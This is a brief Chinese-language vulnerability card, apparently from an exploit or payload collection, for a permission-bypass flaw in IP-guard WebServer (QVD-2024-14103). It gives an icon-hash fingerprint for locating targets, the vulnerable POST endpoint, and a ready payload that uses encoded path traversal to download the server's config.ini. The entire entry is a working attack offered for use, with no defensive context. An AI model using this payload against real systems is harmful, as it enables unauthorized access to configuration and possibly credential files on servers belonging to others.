# IP-guardWebServer存在权限绕过漏洞(QVD-2024-14103)

IP ｜ 认证/授权绕过 ｜ —
- **指纹**：`icon_hash="2030860561"`
- **请求**：`POST /ipg/appr/MApplyList/downloadFile_client/getdatarecord HTTP/1.1`

**Payload**
```
path=..%2Fconfig.ini&filename=1&action=download&hidGuid=1v%0D%0A
```